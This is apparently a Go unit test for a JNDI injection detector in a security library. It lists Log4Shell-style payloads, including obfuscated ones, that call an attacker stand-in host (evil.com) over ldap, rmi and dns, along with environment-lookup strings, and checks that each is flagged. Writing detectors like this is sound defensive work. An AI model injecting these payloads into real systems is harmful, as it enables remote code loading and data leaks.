// Copyright (c) 2026 erik <erik@erik.xyz> — https://erik.xyz

package injection

import (
	"testing"

	"github.com/erikwang2013/security-go"
)

func TestJNDI(t *testing.T) {
	d := &JNDI{}
	if got := d.Name(); got != "jndi_injection" {
		t.Fatalf("Name() = %q, want %q", got, "jndi_injection")
	}
	tests := []struct {
		input  string
		should bool
	}{
		// payloads
		{"${jndi:ldap://evil.com/a}", true},
		{"${jndi:rmi://evil.com/a}", true},
		{"${lower:j}ndi:ldap://evil.com/a}", true},
		{"${lower:jndi}", true},
		{"${upper:JNDI}", true},
		{"${env:JAVA_HOME}", true},
		{"${sys:java.version}", true},
		{"${java:os.name}", true},
		{"${date:yyyy-MM-dd}", true},
		{"${::-j}${::-n}${::-d}${::-i}", true},
		{"ldap://evil.com/test", true},
		{"rmi://evil.com/exploit", true},
		{"dns://evil.com", true},
		// benign / boundary
		{"normal text", false},
		{"${HOME}", false},
		{"${jndi", false},
		{"ldap.example.com", false},
		{"", false},
	}
	var meta *security.Result
	for _, tc := range tests {
		r := d.Detect(tc.input)
		if r.Detected != tc.should {
			t.Errorf("input=%q: got detected=%v, want %v", tc.input, r.Detected, tc.should)
		}
		if tc.should && meta == nil {
			meta = r
		}
	}
	if meta == nil {
		t.Fatal("no detected case to verify metadata")
	}
	if meta.Severity != security.SeverityCritical {
		t.Errorf("detected severity = %v, want SeverityCritical", meta.Severity)
	}
	if meta.Message == "" {
		t.Error("detected Message must not be empty")
	}
	if meta.Details["pattern"] == nil {
		t.Error("detected Details must contain pattern")
	}
	if r := d.Detect("hello"); r.Name != d.Name() || r.Detected {
		t.Errorf("undetected result: Name=%q Detected=%v, want %q/false", r.Name, r.Detected, d.Name())
	}
}
